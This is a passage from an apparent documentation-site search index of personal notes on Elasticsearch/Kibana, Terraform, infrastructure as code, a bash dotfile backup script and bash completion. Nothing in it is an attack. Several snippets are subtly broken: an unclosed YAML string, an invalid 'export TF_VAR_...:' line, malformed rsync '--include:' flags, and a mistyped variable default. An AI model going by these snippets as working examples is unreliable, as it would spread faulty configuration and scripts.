<li>Documents</li> <li>Type + JSON data (represents a row in a relational database)</li> <li>Index</li> <li>Collection of documents based on criteria (e.g., Customers index)</li> <li>Shards</li> <li><code>Primary shard</code>: Handles read/write operations</li> <li><code>Replica</code>: Read-only copy of a primary shard</li> </ul>"},{"location":"docs/cloud/ELK/elk/#cross-cluster-search-ccs","title":"Cross Cluster Search (CCS)","text":"<p>A single search request can be performed on both local and remote clusters.</p>"},{"location":"docs/cloud/ELK/elk/#kibana","title":"Kibana","text":"<p>The metrics of Kibana are not shown by default. You need to create a default index pattern Not to be confused with index template</p> <p>Index and Index Template are Elasticsearch constructs. Index Pattern is a Kibana construct.</p> <ul> <li>Index templates</li> <li>Allow defining templates automatically applied to new indices</li> <li>Include both settings and mappings</li> <li> <p>Contain pattern template controlling template application</p> </li> <li> <p>Index pattern</p> </li> <li>Identifies one or more Elasticsearch indices to explore with Kibana</li> </ul> <pre><code># Example kibana.yml\n# Port for Kibana webserver to listen on\nserver.port: 5601\n# Address/interface for Kibana to bind to.\nserver.host: 0.0.0.0\n# List of Elasticsearch nodes for Kibana to connect to.\n# In a multi node setup, include more than 1 node here (ideally a data node)\nelasticsearch.hosts: [\"http://elasticsearch1.host:9200\",\n\"http://elasticsearch2.host:9200\"]\n# Credentials for Kibana to connect to Elasticsearch if security is setup\nelasticsearch.username: \"kibana_system\n</code></pre>"},{"location":"docs/cloud/ELK/elk/#filebeat","title":"Filebeat","text":"<p>Beats can be used to collect and ship data directly from source systems (endpoints, network appliances, cloud APIs) into Logstash or Elasticsearch.</p>"},{"location":"docs/cloud/ELK/elk/#beats-types","title":"Beats Types","text":"<p>Docs</p> <ul> <li>Filebeat: Collects and ships log files</li> <li>Metricbeat: Gathers system and service metrics (CPU, memory)</li> <li>Packetbeat: Monitors network traffic</li> <li>Heartbeat: Checks service availability</li> <li>Auditbeat: Tracks user and process activity</li> <li>Winlogbeat: Ships Windows event logs</li> <li>Functionbeat: Serverless function for cloud monitoring</li> </ul>"},{"location":"docs/cloud/ELK/elk/#log-aggregation-and-metrics","title":"Log Aggregation and Metrics","text":"<p>Elasticsearch can aggregate large volumes of data quickly due to its distributed nature. Two primary types:</p> <ol> <li>Bucket aggregations: Group documents based on field values or ranges</li> <li>Metrics aggregations: Calculate metrics (avg, min, max, count, cardinality)</li> </ol>"},{"location":"docs/cloud/ELK/elk/#log-standards","title":"Log Standards","text":"<ul> <li>UDM (Unified Data Model) Options</li> <li>Force log standard on all organization apps</li> <li>Transform logs to meet standard</li> </ul>"},{"location":"docs/cloud/ELK/elk/#example-of-udm","title":"Example of UDM","text":"<p>Imagine your company has:</p> <ul> <li>App A logs errors as: <code>{ \"msg\": \"DB failed\" }</code></li> <li>App B logs errors as: <code>{ \"error\": \"Database disconnect\" }</code></li> </ul> <p>Option 1 Solution: Force both teams to use: <code>{ \"message\": \"text\", \"severity\": \"level\" }</code></p> <p>Option 2 Solution: Use Logstash rules to convert both formats into: <code>{ \"message\": \"DB failed\", \"severity\": \"ERROR\" }</code></p>"},{"location":"docs/cloud/ELK/elk/#shard-sizing","title":"Shard Sizing","text":"<ul> <li>Each shard should hold between 30 GB and 50 GB of data</li> <li>High-performance search: benefit from smaller shards</li> <li>Logging use cases: can use slightly larger shards</li> </ul> <pre><code># Check if the status is green\ncurl localhost:9200/_cluster/health\n</code></pre>"},{"location":"docs/cloud/ELK/elk/#setting-up-elasticsearch","title":"Setting Up Elasticsearch","text":"<p>Runs on the JVM. Settings can be tweaked using jvm.options file (<code>/etc/elasticsearch/jvm.options</code>).</p>"},{"location":"docs/cloud/ELK/elk/#static-changes","title":"Static Changes","text":""},{"location":"docs/cloud/ELK/elk/#checking-heap-size","title":"Checking Heap Size","text":"<ul> <li>Recommended to set min/max heap size to same value</li> <li>Allocate no more than half available memory to JVM heap</li> </ul> <pre><code># Example for 8GB RAM node\n-Xms4g # Minimum heap size\n-Xmx4g # Maximum heap size\n</code></pre>"},{"location":"docs/cloud/ELK/elk/#node-configuration","title":"Node Configuration","text":"<p>Configure using <code>elasticsearch.yml</code> (<code>/etc/elasticsearch/elasticsearch.yml</code>):</p> <pre><code># All nodes in a cluster should have the same name\ncluster.name: lab-cluster\n# Set to hostname if undefined\nnode.name: node-a\n# Port for the node HTTP listener\nhttp.port: 9200\n# Port for node TCP communication\ntransport.tcp.port: 9300\n\n# Those dirs must exist before (elasticsearch needs RW permissions)\npath.data: /mnt/disk/data\npath.logs: /mnt/disk/logs\n\n# List of initial master eligible nodes\ncluster.initial_master_nodes:\n# List of other nodes in the cluster\ndiscovery.seed_hosts:\n# Network host for server to listen on\nnetwork.host: 0.0.0.0\n</code></pre>"},{"location":"docs/cloud/ELK/elk/#dynamic-changes","title":"Dynamic Changes","text":"<p>Dynamic settings can be controlled using the <code>_cluster/settings API</code>.</p> <p>Note: Older versions of Elasticsearch had a <code>_type</code> field for document types. This was deprecated in Elasticsearch 7.0 and will be removed. The value was set to <code>_doc</code> after deprecation.</p>"},{"location":"docs/cloud/ELK/elk/#concurrency","title":"Concurrency","text":"<p>To prevent data update collisions, Elasticsearch uses version identifiers to check current version and compute differences.</p>"},{"location":"docs/cloud/ELK/elk/#documents","title":"Documents","text":"<p>Documents are simply JSON blobs. Collections of documents are categorized for querying.</p>"},{"location":"docs/cloud/ELK/elk/#mappings","title":"Mappings","text":"<p>Mappings define field types and names. Remember to always map your fields.</p>"},{"location":"docs/cloud/ELK/elk/#text-vs-keyword","title":"Text vs Keyword","text":"<ul> <li>Text: Allows rich full-text search</li> <li>Keyword: Each token acts like an enum (lightning-fast lookups)</li> </ul> <p>Uses TF/IDF algorithm for search relevance.</p>"},{"location":"docs/cloud/iaC/configuration_drift/","title":"Configuration drift","text":"<p>Provisioned Infrastructure Has an Unexpected Configuration Change** </p>"},{"location":"docs/cloud/iaC/configuration_drift/#possible-causes","title":"Possible Causes","text":"<ul> <li>Team members manually adjusting configuration options</li> <li>Malicious actors</li> <li>Side effects from APIs, SDKs, or CLIs</li> </ul>"},{"location":"docs/cloud/iaC/configuration_drift/#prevent","title":"Prevent","text":"<ul> <li>Immutable Infrastructure: Always create and destroy, never     reuse<ul> <li>Servers are never modified after they are deployed.</li> <li>Use baking AMI images or containers via AWS Image Builder, etc.</li> </ul> </li> <li>GitOps: Implement version control for infrastructure changes.</li> </ul>"},{"location":"docs/cloud/iaC/configuration_drift/#detect","title":"Detect","text":"<ul> <li>Compliance tools<ul> <li>Use Terraform refresh     and plan commands to ensure the infrastructure matches the     desired state.</li> </ul> </li> </ul>"},{"location":"docs/cloud/iaC/configuration_drift/#correct","title":"Correct","text":"<ul> <li>AWS compliance tools</li> <li>Store expected state using <code>Terraform state files</code>.</li> </ul> <ul> <li>Infrastructure as Code (IaC)</li> </ul>"},{"location":"docs/cloud/iaC/iaC/","title":"iaC","text":""},{"location":"docs/cloud/iaC/iaC/#infrastructure-as-code","title":"Infrastructure as code","text":"<p>Write configuration scritp to automate,creating updaitng or destroing cloud infrusturcture - Blue print for infrusturcture** - Easily share ,version or invenrotru of cloud infrusturcture</p>"},{"location":"docs/cloud/iaC/iaC/#problem-with-the-manual-configuration","title":"Problem with the Manual configuration","text":"<ul> <li>Esy to mis-configure a service though human error</li> <li>Hard to menage the expected state of configuration for complaince</li> <li>Hart to transfrer configuartion knowdlage to others</li> </ul>"},{"location":"docs/cloud/iaC/iaC/#iac-tools","title":"iaC tools","text":""},{"location":"docs/cloud/iaC/iaC/#infrastructure-lifecycle","title":"Infrastructure Lifecycle","text":"<p>A number of clearly defined and succinct work phases which are used by DevOps to plan, design, build, and test cloud infrastructure. </p>"},{"location":"docs/cloud/iaC/iaC/#work-phases-day-0-day-1-day-3","title":"Work Phases: Day 0, Day 1, Day 3","text":"<ul> <li>Day 0: Plan and Design</li> <li>Day 1: Build and Configure</li> <li>Day 2: Test and Validate</li> <li>Day 3: Deploy and Monitor</li> </ul>"},{"location":"docs/cloud/iaC/iaC/#configuration-drift","title":"### Configuration drift","text":"<ul> <li>CI CD</li> <li>terraform</li> </ul>"},{"location":"docs/cloud/terraform/debbuging_terraform/","title":"Debbuging terraform","text":"<ul> <li>Detailed logging can be enable via <code>TF_LOG</code> and <code>TF_LOG_PATH</code> env     var**</li> <li>Loggin can be enabled separatly via <code>TF_LOG_CORE</code> <code>TF_LOG_PROVIDER</code></li> <li>Here are the options:<ul> <li>TRACE</li> <li>DEBUG</li> <li>INFO</li> <li>WARN</li> <li>ERROR</li> <li>JSON(outputs logs at TRACE level or higher in json) ## Crash     Logs If terraform ever crashes it saves a log file with the     debug logs form the seesion and the backtrace</li> </ul> </li> </ul> <ul> <li>Terraform</li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/hashicorp_terraform_examination/","title":"Hashicorp terraform examination","text":"<p>Course Link</p> <ul> <li>terraform</li> <li>Configuration drift</li> <li>Infrastructure as Code (IaC)</li> <li>CI CD</li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/","title":"Terraform","text":"<p>Best Practices</p> <p>open source cloud agnostic iac </p> <ul> <li>Declarative configuration files</li> <li>Installable modules</li> <li>Plan and predict changes</li> <li>Dependency graphing</li> <li>State management</li> <li>Provision infrastructure in familiar languages</li> <li>Terraform     Registry /     Terraform modules     structure<ul> <li>via AWS CDK</li> </ul> </li> </ul> <p>Speculative vs Saved </p>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#terraform-state","title":"Terraform state","text":"","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#registry","title":"Registry","text":"","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#initializing","title":"Initializing","text":"<p>The initialization works like npm install; it fetches the requirements.</p>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#structure","title":"Structure","text":"<p><code>Terraform Block</code> Terraform setting and the required <code>providers</code> - <code>source</code> defines an optional hostname, namespace, and type</p> <ul> <li>By default, providers are pulled from the Terraform     Registry</li> </ul> <pre><code>terraform {\n  required_providers {\n    docker = {\n      source  = \"kreuzwerker/docker\"\n      version = \"~&gt; 3.0.1\"\n    }\n  }\n}\n</code></pre> <code>Provider Block</code> Stores configuration of the provider List all the providers <code>bash terraform providers</code> <code>terraform host = \"ssh://user@remote-host:22\"</code> - Aliases (To disguise the same providers e.g., AWS regions) <p> Docker Provider Example</p> <p><code>Resource Block</code> Components of the infrastructure (<code>type</code> and <code>name</code>)</p> <pre><code>// resource type docker_container resource name nginx\nresource \"docker_image\" \"nginx\" {\n  name         = \"nginx:latest\"\n  keep_locally = false\n}\n</code></pre> <p><code>modules</code> (Modules are just like roles in Ansible; they are pre-packed.) - Providers are the raw APIs, whereas modules give you shorthand.</p> Variable Type Description Input Variables Parameters passed to Terraform modules. They can be declared in either the root module or a child module. Options - default: Assigns a default value to the variable. - type: Specifies the data type of the variable. - description: (Optional) Used for documentation purposes. - validation: Provides a way to add conditional checks (similar to <code>if</code> statements) to validate input values. - sensitive: Marks the variable as sensitive, meaning it won\u2019t appear in the output of Terraform (useful for private or secret values). <pre><code>variable \"docker_ports\" {\n  type = list(object({ internal = number }))\n  default = [{ protocol = \"tcp\" }]\n}\n</code></pre> <p><code>HEREDOC</code> multiline strings <code>bash &lt;&lt;EOT test world hello EOT</code> <code>string directive % %</code> can be used in <code>HEREDOC</code> - <code>~</code> will strip the space</p> <pre><code>\"Hello %{if var.name != \"\"}%{else}%{endif}\"\n&lt;&lt;EOT\n%{for ip in aws_instance.example.*.private_ip ~}\nserver ${ip}\n%{ endfor }\nEOT\n</code></pre> <p><code>null</code> is either absent or default</p> <p><code>ternary if else conditions</code> the return type for the if statement must be the same type</p> <pre><code>condition ? true_val : false_val\nvar.a != \"\" ? var.a : \"default-a\"\n</code></pre> <p><code>for loops</code></p> <pre><code># Arrays\n[for s in var.list : upper(s)]\n\n# Maps\n[for k, v in var.map : length(k) + length(v)]\n\n# Returning structure\n{for s in var.list : s =&gt; upper(s)}\n</code></pre> <p><code>splat expression</code> iterate over everything</p> <pre><code>var.list[*].id\nvar.list[*].interfaces.name\n</code></pre> <p><code>Dynamic blocks</code> similar to loop in Ansible</p> <pre><code>dynamic \"ingress\" {\n    for_each = local.ingressrules\n}\n</code></pre>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#variables-definitions-files","title":"Variables Definitions Files","text":"","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#env-vars","title":"Env Vars","text":"<p><code>Outputs</code> similar to Ansible registers</p> <pre><code>output \"instance_ip\" {\n  value = aws_instance.my_instance.public_ip\n}\n</code></pre> <ul> <li><code>data block</code> (<code>source</code> and <code>name</code>)     Docs</li> </ul> <pre><code>data \"aws_ami\" \"example\" {\n  most_recent = true\n  owners = [\"self\"]\n  tags = {\n    Name   = \"app-server\"\n    Tested = \"true\"\n  }\n}\n</code></pre> <ul> <li><code>lifecycle</code> - <code>precondition</code> if statement for the data block<ul> <li><code>postcondition</code></li> </ul> </li> </ul> <p><code>Important</code> Use provisioners as a last resort. There are better alternatives for most situations. Refer to Declaring Provisioners</p> <ul> <li><code>file provisioner</code> copies files from local machine to new     resource</li> <li><code>connection</code> tells how to establish connection<ul> <li>With <code>ssh</code> connect through Bastion Host</li> </ul> </li> <li><code>null_resources</code> placeholder for resources with no provider<ul> <li><code>triggers</code> Map of values which cause provisioners to re-run</li> </ul> </li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#local-exec","title":"Local Exec","text":"<p>Execute local commands after a resource is provisioned <code>command</code> (required) Command to execute <code>working_dir</code> <code>interpreter</code> Entry point for the command <code>environment</code> env vars</p> <pre><code>resource \"terraform_data\" \"example1\" {\n  provisioner \"local-exec\" {\n    command = \"open WFH, '&gt;completed.txt' and print WFH scalar localtime\"\n    interpreter = [\"perl\", \"-e\"]\n  }\n}\n</code></pre>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#remote-execute","title":"Remote Execute","text":"<p>It\u2019s the same, just has modes</p> <p>You can only choose to use one mode at a time - <code>Inline</code> list of command strings - <code>Script</code> script that will be copied and executed - <code>Scripts</code> multiple script execution</p>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#execution-plans","title":"Execution Plans","text":"<p>A Manual Review of What I\u2019ll Add, Change, or Destroy Before Applying Changes</p>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#visualize","title":"Visualize","text":"<p>Use Graph Viz to create the graph of your plan</p> <pre><code>terraform graph | dot -Tsvg &gt; graph.svg\n</code></pre>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#terraform-core-and-plugins","title":"Terraform Core and Plugins","text":"<ul> <li><code>Core</code> uses RPC to communicate with     plugins</li> <li><code>Plugins</code> expose implementation for a specific service or     provisioner</li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform/#terraform-and-ansible","title":"Terraform and Ansible","text":"<p>Terraform Spotify</p>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_backends/","title":"Terraform backends","text":"<p>It specyfie where and hwo operation are performed and where the snapshot are stored Standard backends(ussualy third-party backends e.g.AWS S3) - The defualt is local - u can pass another state file to cross refrence-stacs - only store state - does not perform terrafor operations - to perform operation uses CLI on you local machine</p> <pre><code># It storse the state files\nbackend \"s3\"{\n    bucket = \"terraform-state000\"\n    key = \"statefile\"\n    region = \"eu-central-1\"\n}\n</code></pre> <p> Enhanced backends - can both sotre state - can perform terraform operations - <code>Local</code> files and data sotred locally - <code>Remote</code> files and data stored in the Cloud - The <code>Terraform Clourd Run Enviroment</code> is responsble for executing the operation - When using repote backedn u need to set <code>Workspaces</code> - (single via name multiple via prefix)</p> <p><code>Cloud block</code> is the preffered way but u can still use <code>remote backed</code> block</p> <pre><code>       terraform {\n       cloud {\n   hostname     = \"app.terraform.io\"\n   organization = \"foo\"\n   workspaces {\n     # single Workspace\n     name   = \"my-single-workspace\"\n     prefix = \"my-app-second-workspace\"\n   }\n }\n}\n</code></pre> <p><code>#IMPORTANT</code></p> <p>Becouse u run this in a cloud enviroment</p> <p>Your provider crediatinals need to be configured in as Env Vars in Terraform cloud</p>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_backends/#backend-initialization","title":"Backend Initialization","text":"<p>The <code>backednd-config</code> falg for terraform init used for <code>partial backend</code> configuration - Use when the backend seting are dynamic or sensitive Baiscly u run this form another file </p> <ul> <li>Teraform</li> <li>Teraform state</li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_cloud/","title":"Terraform cloud","text":"<p> - Organizaitons - A collection of workspacess - Workspaces - Unique enviromnment or stack,</p> <ul> <li>Teams<ul> <li>Composed of multiple users</li> <li>Can be assinged to the workspace</li> </ul> </li> <li>Runs</li> <li>A run resperesnts a single-run of terreaform run<ul> <li>Runs coul be UI/VSC dirven API driven or CLI driven</li> </ul> </li> </ul>"},{"location":"docs/cloud/terraform/terraform_cloud/#terraform-cloud-run-workflows","title":"Terraform Cloud run Workflows","text":"<ul> <li>UI/VCS Driven(user interface or Version control system)<ul> <li>Uses webhooks or Github actions</li> </ul> </li> <li>API-DIRVEN<ul> <li>Will trigger runs via upload a configuration file via the     <code>Terra Cloud API</code></li> <li>Will trigger runs by uploading a configuration file via the     Terraform Cloud API.</li> </ul> </li> <li>CLI-Driven</li> </ul>"},{"location":"docs/cloud/terraform/terraform_cloud/#terraform-cloud-run-triggers","title":"Terraform Cloud Run Triggers","text":"<p><code>Source Workspaces</code> Connect workspaces to one or more workspaces - Run triggers - Designed for workspacess that relay on inforamtion from another workspacess</p>"},{"location":"docs/cloud/terraform/terraform_cloud/#organization-level-permissions","title":"Organization-Level Permissions","text":"<ul> <li>Organizaiton owners(baiscly a root account)</li> </ul> <p>Organizaion level perrmissions ### Terrafom Cloud Agents Communicate wiht isolated .private or on-presmiswe infrastuecture</p>"},{"location":"docs/cloud/terraform/terraform_cloud/#teraaform-enterprise","title":"Teraaform Enterprise","text":"<p>Self-hosted licens distribiout of the terrafrom platofmr </p>"},{"location":"docs/cloud/terraform/terraform_config_files/","title":"Terraform config files","text":"<ul> <li>Terraform file end in the etendsion of <code>.tf</code> or either <code>.tf.json</code></li> </ul> Terraform supports an alternative syntax that is JSON-compatible Useful for generating configurations programmatically <ul> <li>terraform</li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_config_files/#variable-definitions-files","title":"Variable definitions files","text":"<p>Allows to decle mulitple varaibles at once - Named <code>.tfvars</code> or <code>tfvars.json</code></p>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_config_files/#env-variables","title":"Env variables","text":"<ul> <li>Variables staring with <code>TF_VAR</code> will be loaded</li> </ul> <pre><code>export TF_VAR_image_id: ami-abc123\n</code></pre>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_config_files/#loading-input-varaibles","title":"Loading input varaibles","text":"<ul> <li>Prioriority<ol> <li>Env Vars</li> <li><code>terraform.tfvars</code></li> <li><code>terraform.tfvars.json</code></li> <li><code>-var</code> and <code>-var-file</code></li> </ol> </li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_registry/","title":"Terraform registry","text":"- Public - Private (part of the terraform cloud) - publish private module - hase to be connectoed to <code>VSC</code>(version control system) - terraform ### Terraform cloud  <ul> <li>Terraform module     structure</li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_standard_module_sturcture/","title":"Terraform standard module structure","text":"<p>To configure private moudle u need to login via Terraform cloud/Terraform Login - Terraform Registery</p> <p><code>IMPORTANT</code>only veryfied modules and offical will be displayed in the search bar</p> The primary entry point is the RooT Module - Requaierd files - Main.tf - Varaibles.tf - Outpust.tf - README.md - LICEANSE - Nested Modules - submodule that contians README is considered usable by external users - submodule that doesn\u2019t have README is considerd internal use only** <ul> <li>Terraform</li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_state/","title":"Terraform state","text":"<p>Represents the current state of the resources in the cloud </p> <p><code>state mv</code> allows to change the refrence so u avodi create and destroy action - rename exisitng resources - move a resource into a module - move a module into a module</p> <p>Rename resource</p> <pre><code># example\nterraform state mv packet_device.worker packet_device.helper\n</code></pre> <p>Move resource into module</p> <pre><code>terraform state mv packet_device.worker module.worker.packet_device.worker\n</code></pre> <p>Move moudle into a module</p> <pre><code>terraform state mv module.app module.parent.module.app\n</code></pre>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_state/#replacing-resources","title":"Replacing Resources","text":"<p>Cloud resoruce can become degraded or damaged and u want to return it to a healty state</p> <pre><code># provide the flag and the resource adress\n#Works only on one resource!!!\n# avaibable on plan and apply \nterraform apply -replace=\"aws_instance.example[0]\"\n</code></pre>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_state/#terraform-state-backups","title":"Terraform State Backups","text":"<p>*All commands that modify state will write a backup file** - Terraform sotores it in <code>terraform.tfstate.backup</code> \u2014</p> <p><code>Note</code> Backup cannot be disabled!</p> <p>to get rid of it u have to delete it mannualy</p> ### Resource addressing  #### Refresh-Only Mode  ### Terrafrom_remote_state Retrieves the root module output values from another Terraform configuration - Only the root-level values from the remote state snapshot are exposed. - Resource data and output values from nested modules are not accessible. - To enable that, explicitly configure a passthrough in the root module.** ### Alternative to Remote State The <code>terraform_remote_state</code> only exposes output values, requiring users to access the entire state snapshot, which may contain sensitive information. <p><code>IMPORTANT</code> Publish data for external consumption to a sepearte location instead of using remote state </p>","tags":["terraform"]},{"location":"docs/cloud/terraform/terraform_state/#terraform-state-locking","title":"Terraform State Locking","text":"<p>Terraform will lock your state for all operations that could write sate.</p> <ul> <li>Disableing Locing(not recommended <code>-lock</code> flag)</li> <li>Force unlock(mannualy unlock satte if it failes)<ul> <li> <p>If u unlock the sate when someone is hold a lock it causes     multiple wirters issues</p> <ul> <li>The command requaiers the uniqe lock id</li> <li>Terraform wil oputput lock ID if unlocking fails</li> </ul> <pre><code>terraform force-unlock &lt;lock id&gt; -force\n</code></pre> </li> </ul> </li> </ul> <p><code>Note</code>Terraform log doesn\u2019t show if it fails or succeeds only if it takes to long</p> <ul> <li>Teraform</li> </ul>","tags":["terraform"]},{"location":"docs/cloud/terraform/terrafrom-ansible/","title":"terrafrom-ansible","text":"<p>Redhat provides a provider for the ansible</p>","tags":["terraform","ansible"]},{"location":"docs/cloud/terraform/terratest/","title":"terratest","text":"<p>Docs for aws Article</p> <ul> <li>It's a golang libary for unit testing terraform<ul> <li>Common issues TerraformDir</li> </ul> </li> </ul> <pre><code># Example of small server deployment\n\nterraform {\n  required_version = \"&gt;= 0.12.26\"\n}\n\nprovider \"aws\" {\n  region = \"us-east-2\"\n}\n\nresource \"aws_instance\" \"example\" {\n  ami                    = \"ami-0d5d9d301c853a04a\"\n  instance_type          = \"t2.micro\"\n  vpc_security_group_ids = [aws_security_group.instance.id]\n\n  user_data = &lt;&lt;EOF\n#!/bin/bash\necho \"Hello, World!\" &gt; index.html\nnohup busybox httpd -f -p 8080 &amp;\nEOF\n}\n\nresource \"aws_security_group\" \"instance\" {\n  ingress {\n    from_port   = 8080\n    to_port     = 8080\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n\noutput \"public_ip\" {\n  value = aws_instance.example.public_ip\n}\n</code></pre>","tags":["terraform","golang","testing"]},{"location":"docs/cloud/terraform/terratest/#examples","title":"Examples","text":"<p>Official example <pre><code>// Example terraform test\npackage test\n\nimport (\n    \"fmt\"\n    \"testing\"\n    \"time\"\n\n    http_helper \"github.com/gruntwork-io/terratest/modules/http-helper\"\n\n    \"github.com/gruntwork-io/terratest/modules/terraform\"\n)\n\nfunc TestTerraformAwsHelloWorldExample(t *testing.T) {\n    t.Parallel()\n\n    // retryable errors in terraform testing.\n    terraformOptions := terraform.WithDefaultRetryableErrors(t, &amp;terraform.Options{\n        TerraformDir: \"../examples\",\n    })\n\n    defer terraform.Destroy(t, terraformOptions)\n\n    terraform.InitAndApply(t, terraformOptions)\n\n    publicIp := terraform.Output(t, terraformOptions, \"public_ip\")\n\n    url := fmt.Sprintf(\"http://%s:8080\", publicIp)\n    http_helper.HttpGetWithRetry(t, url, nil, 200, \"Hello, World!\", 30, 5*time.Second)\n}\n</code></pre></p>","tags":["terraform","golang","testing"]},{"location":"docs/code_snippets/backup_flake_script/","title":"backup flake script","text":"<pre><code># Define include directories\ninclude_dirs=(\n    alacritty\n    i3\n    picom\n    scripts\n    wallpapers\n    dunst\n    nvim\n    polybar\n)\n\n# Define log directory and file\nlogdir=\"$HOME/.log_user/nix_backup\"\nlog_file=\"$HOME/.log_user/nix_backup/nix-log.json\"\n\nmkdir -p \"$logdir\" || { echo \"Error: Unable to create log directory\" &gt;&amp;2; exit 1; }\n\ntouch \"$log_file\" || { echo \"Error: Unable to create log file\" &gt;&amp;2; exit 1; }\n\nsend_notification() {\n    notify-send \"Backup Error\" \"$1\"\n}\n\nrsync_command=\"rsync -av\"\nfor dir in \"${include_dirs[@]}\"; do\n    rsync_command+=\" --include: \"$dir/\" --include='$dir/**'\"\ndone\nrsync_command+=\" --exclude: \"*\"\"\n\noutput=$(eval \"$rsync_command $HOME/.config/ $HOME/Desktop/nixconfig/dotfiles/\") || { send_notification \"Rsync command failed\"; exit 1; }\n\nbackup_flakes=\"rsync -av /etc/nixos/ $HOME/Desktop/nixconfig/\"\nsecond_output=$(eval \"$backup_flakes\") || { send_notification \"Flakes backup command failed\"; exit 1; }\n\ncurDate=$(date)\n\njson_object=$(jq -n --arg date \"$curDate\" --arg output \"$output\" --arg flakes \"$second_output\" '{date: $date, configs: $output, flakes: $flakes, exit_code: 0}')\n\necho \"$json_object\" &gt;&gt; \"$log_file\" || { send_notification \"Unable to append to log file\"; exit 1; }\n\n##notify-send \"Backup $curDate Dotfiles\" \"These files have been changed in: $output\"\n#notify-send \"Backup $curDate Flakes\" \"These files have been changed in: $second_output\"\n# Switch to the backup branch and push changes\ncd \"$HOME/Desktop/nixconfig/\" || { send_notification \"Unable to change directory\"; exit 1; }\ngit switch backup || { send_notification \"Unable to switch branch\"; exit 1; }\ngit add . || { send_notification \"Unable to add changes to the index\"; exit 1; }\ngit commit -am \"automatic push $curDate\" || { send_notification \"Unable to commit changes\"; exit 1; }\ngit push --set-upstream origin backup || { send_notification \"Unable to push changes to remote repository\"; exit 1; }\n\n\nnotify-send \"UPDATE Statu \" \"Sucessfull\"\nexit 0\n</code></pre> <p>Code Snipeets Main</p>"},{"location":"docs/code_snippets/bash_copmplitons_man/","title":"Bash Programmable Completion Summary","text":""},{"location":"docs/code_snippets/bash_copmplitons_man/#overview","title":"Overview","text":"<ul> <li>Programmable completion in Bash is triggered when word completion is     attempted for an argument to a certain command.</li> <li>This command must have a completion specification (compspec) defined     using the <code>complete</code> builtin command.</li> </ul>"},{"location":"docs/code_snippets/bash_copmplitons_man/#how-it-works","title":"How It Works","text":""},{"location":"docs/code_snippets/bash_copmplitons_man/#identifying-command-name","title":"Identifying Command Name","text":"<ol> <li>Empty String: If the command word is empty, a compspec defined     with the <code>-E</code> option to <code>complete</code> is used.</li> <li>Full Pathname: If the command word is a full pathname, the     system first searches for a compspec for the full pathname.</li> <li>Fallback: If no compspec is found, the system uses the <code>-D</code>     option to <code>complete</code> for a default. If no default exists, alias     expansion is attempted.</li> </ol>"},{"location":"docs/code_snippets/bash_copmplitons_man/#generating-matching-words","title":"Generating Matching Words","text":"<ul> <li>Once a compspec is found, it is used to generate a list of matching     words.</li> <li>If no compspec is found, default Bash completion occurs.</li> </ul>"},{"location":"docs/code_snippets/bash_copmplitons_man/#steps-for-generating-matches","title":"Steps for Generating Matches","text":"<ol> <li>Actions specified by compspec: Matches must be prefixed by the     word being completed.</li> <li>Pathname Expansion with -G option: The <code>FIGNORE</code> variable     filters matches.</li> <li>String argument with -W option: The string is split and     expanded. Matches are then prefix-matched against the word being     completed.</li> <li>Commands/Functions with -F and -C: These are invoked with     certain environment variables (<code>COMP_LINE</code>, <code>COMP_POINT</code>, etc.) set.</li> </ol>"},{"location":"docs/code_snippets/bash_copmplitons_man/#filters-prefixes-and-suffixes","title":"Filters, Prefixes, and Suffixes","text":"<ul> <li>A filter specified with the <code>-X</code> option is applied to the list of     generated matches.</li> <li>Prefix and suffix specified with <code>-P</code> and <code>-S</code> are added to each     member of the completion list.</li> </ul>"},{"location":"docs/code_snippets/bash_copmplitons_man/#additional-options","title":"Additional Options","text":"<ul> <li><code>-o dirnames</code>: Triggers directory name completion if no matches are     generated.</li> <li><code>-o plusdirs</code>: Adds directory name completions to the result.</li> <li><code>-o bashdefault</code>: Tries Bash default completions if compspec     generates no matches.</li> <li><code>-o default</code>: Tries readline\u2019s default completion if no matches are     generated.</li> </ul>"},{"location":"docs/code_snippets/bash_copmplitons_man/#dynamic-completion","title":"Dynamic Completion","text":"<ul> <li>Completion can be modified dynamically using shell functions.</li> <li>A function that returns an exit status of 124 triggers reevaluation     of the compspec.</li> </ul>"},{"location":"docs/code_snippets/bash_copmplitons_man/#example-for-dynamic-completion","title":"Example for Dynamic Completion","text":"<p>Here\u2019s an example function for dynamically loading completions.</p> <pre><code>_completion_loader() {\n    . \"/etc/bash_completion.d/$1.sh\" &gt;/dev/null 2&gt;&amp;1 &amp;&amp; return 124\n}\ncomplete -D -F _completion_loader -o bashdefault -o default\n</code></pre> <p>Bash Main</p>"},{"location":"docs/code_snippets/cloud_watch_config/","title":"Cloud watch configuration json","text":"<p>Basic cofniguration to watch the ec2_instance</p> <pre><code>{\n    \"agent\": {\n            \"metrics_collection_interval\": 60,\n            \"region\": \"eu-west-1\",\n            \"logfile\": \"/opt/aws/amazon-cloudwatch-agent/logs/amazon-cloudwatch-agent.log\",\n            \"run_as_user\": \"root\"\n    },\n    \"metrics\": {\n            \"metrics_collected\": {\n                    \"disk\": {\n       